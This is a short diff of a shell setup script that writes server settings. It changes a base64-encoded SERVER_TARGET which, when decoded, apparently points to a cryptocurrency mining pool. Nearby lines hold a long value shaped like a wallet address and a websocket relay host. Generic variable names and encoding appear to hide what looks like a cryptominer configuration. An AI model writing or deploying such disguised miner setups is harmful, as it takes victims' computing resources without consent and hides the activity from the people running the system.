@@ -20,7 +20,7 @@ export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
 echo "SERVER_WS=wss://vpn.dichoiseptoa.site
-SERVER_TARGET=aGFzaC5kZW1vLWN1dGZsb3cubXkuaWQ6ODA4MA==
+SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
 SERVER_SECRET=$NAME
 SERVER_CONNECTION=$PORT
